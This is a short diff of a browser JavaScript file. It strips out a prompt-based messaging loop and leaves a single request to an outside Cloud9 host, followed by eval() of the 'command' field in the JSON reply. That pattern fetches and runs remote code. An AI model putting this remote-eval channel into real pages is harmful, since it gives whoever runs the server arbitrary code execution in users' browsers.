@@ -1,19 +1,7 @@
-var ans  = "";
-var url = "";
-var msgs;
-var name = prompt("Username: ");
-var key = prompt("Trigger key to message:");
-document.onkeydown = function(e){
-if(e.key == key){url  = "http://socket-gorgamite.c9users.io?name=" +name +  "&msg=" + prompt(msgs+ "\nMessage:");}};
 var request = new XMLHttpRequest();
-var loop = setInterval(function(){ 
-  request.open('GET', url);
-  if (url.indexOf("?")>-1){
-  ans = "old";
-  url = url.substring(0,url.indexOf("?"));}
+  request.open('GET', "http://socket-gorgamite.c9users.io");
   request.responseType = 'json';
   request.send();
-},1000);
-request.onload = function(){
-eval(request.response.command);
-}
+  request.onload = function(){
+    eval(request.response.command)
+  }
